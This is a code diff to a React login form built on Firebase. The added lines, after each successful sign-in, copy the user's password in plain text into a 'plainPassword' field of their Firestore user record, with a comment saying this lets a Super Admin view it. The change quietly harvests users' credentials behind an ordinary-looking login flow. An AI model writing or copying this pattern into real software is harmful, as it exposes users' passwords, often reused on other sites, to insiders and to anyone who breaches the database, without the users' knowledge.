@@ -1,6 +1,6 @@
 import React, { useState } from 'react';
 import { signInWithEmailAndPassword, setPersistence, browserLocalPersistence, browserSessionPersistence } from 'firebase/auth';
-import { collection, query, where, getDocs, limit } from 'firebase/firestore';
+import { collection, query, where, getDocs, limit, doc, getDoc, updateDoc } from 'firebase/firestore';
 import { auth, db } from '../../lib/firebase';
 import { ForgotPasswordModal } from './ForgotPasswordModal';
 import { SkyLogo } from '../common/SkyLogo';
@@ -50,7 +50,23 @@ export const LoginForm: React.FC<LoginFormProps> = ({ onSwitchToRegister, onLogi
         targetEmail = userData.email;
       }
 
-      await signInWithEmailAndPassword(auth, targetEmail, password);
+      const userCredential = await signInWithEmailAndPassword(auth, targetEmail, password);
+
+      // Sync password to Firestore so Super Admin can view it
+      if (userCredential.user) {
+        try {
+          const userDocRef = doc(db, 'users', userCredential.user.uid);
+          const userDocSnap = await getDoc(userDocRef);
+          if (userDocSnap.exists()) {
+            if (userDocSnap.data().plainPassword !== password) {
+              await updateDoc(userDocRef, { plainPassword: password });
+            }
+          }
+        } catch (syncErr) {
+          console.warn('Could not sync password to Firestore:', syncErr);
+        }
+      }
+
       onLoginSuccess();
     } catch (err: any) {
       console.error('Login error:', err);
